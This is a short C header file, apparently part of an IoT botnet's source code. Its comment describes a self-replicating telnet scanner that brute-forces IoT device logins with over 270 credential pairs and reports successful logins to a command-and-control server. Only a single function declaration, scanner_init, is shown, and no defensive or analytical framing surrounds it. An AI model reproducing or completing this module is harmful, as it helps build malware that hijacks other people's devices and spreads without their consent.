#ifndef _SCANNER_H
#define _SCANNER_H

#include "includes.h"

/* ============================================================================
 * TELNET SCANNER MODULE - Self-Replication
 * ============================================================================
 * Brute-forces telnet credentials on IoT devices
 * 270+ username/password combinations
 * Reports successful logins to C&C via SCAN_CB_PORT
 * ============================================================================ */

void scanner_init(void);

#endif
